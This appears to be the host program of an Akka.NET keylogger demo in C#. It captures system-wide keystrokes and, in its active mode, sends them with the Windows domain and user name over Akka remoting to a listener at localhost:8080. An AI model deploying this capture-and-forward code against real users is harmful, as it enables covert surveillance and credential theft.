using Akka.Actor;
using Akka.Configuration;
using Akka.DI.AutoFac;
using Akka.DI.Core;
using Autofac;
using KeyWatcher.Actors;
using KeyWatcher.Dependencies;
using KeyWatcher.Messages;
using System;
using System.Windows.Forms;

namespace KeyWatcher.Host
{
	class Program
	{
		private const ushort BufferSize = 20;

		static void Main(string[] args)
		{
			//Program.UseSimpleKeyWatcher();
			//Program.UseBufferedKeyWatcher();
			//Program.UseAkkaLocally();
			Program.UseAkkaWithRemoting();
		}

		private static void UseBufferedKeyWatcher()
		{
			using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
			{
				keyLogger.KeysLogged += (s, e) => Console.WriteLine(e.Keys);
				Application.Run();
			}
		}

		private static void UseSimpleKeyWatcher()
		{
			using (var keyLogger = new EventedKeyWatcher())
			{
				keyLogger.KeyLogged += (s, e) => Console.Write(e.Key);
				Application.Run();
			}
		}

		private static void UseAkkaLocally()
		{
			var builder = new ContainerBuilder();
			builder.RegisterModule<DependenciesModule>();
			builder.RegisterModule<ActorsModule>();
			var container = builder.Build();

			var userName = $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName : ".")}\\{Environment.UserName}";

			using (var system = ActorSystem.Create("KeyWatcherHost"))
			{
				new AutoFacDependencyResolver(container, system);

				var user = system.ActorOf(system.DI().Props<UserActor>(), "user");

				using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
				{
					keyLogger.KeysLogged += (s, e) =>
					{
						user.Tell(new UserKeysMessage(userName, e.Keys));
					};

					Application.Run();
				}
			}
		}

		private static void UseAkkaWithRemoting()
		{
			var config = ConfigurationFactory.ParseString(@"
akka {
    actor {
        provider = ""Akka.Remote.RemoteActorRefProvider, Akka.Remote""
    }
    remote {
        helios.tcp {
            port = 8090
            hostname = localhost
        }
    }
}
");

			var userName = $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName : ".")}\\{Environment.UserName}";

			using (var system = ActorSystem.Create("KeyWatcherHost", config))
			{
				var user = system
					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:8080/user/user");

				using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
				{
					keyLogger.KeysLogged += (s, e) =>
					{
						user.Tell(new UserKeysMessage(userName, e.Keys));
					};

					Application.Run();
				}
			}
		}
	}
}
